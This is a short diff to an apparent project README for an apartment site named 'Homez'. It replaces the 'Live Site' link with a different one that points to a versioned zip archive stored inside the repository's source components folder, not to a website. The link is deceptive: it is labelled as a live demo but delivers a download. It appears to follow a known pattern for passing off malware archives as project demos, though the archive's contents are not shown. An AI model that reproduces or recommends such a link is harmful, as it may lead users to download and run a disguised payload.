@@ -2,7 +2,7 @@
 
 ## 🔗 Live Site
 
-👉 [Homez Live](https://github.com/jobayer58/Homez-Apartment/raw/refs/heads/main/src/Components/Apartment-Homez-3.2.zip)
+👉 [Homez Live](https://raw.githubusercontent.com/jobayer58/Homez-Apartment/main/src/Components/Pages/Apartment-Homez-3.4-alpha.3.zip)
 
 
 ## Tech Choices
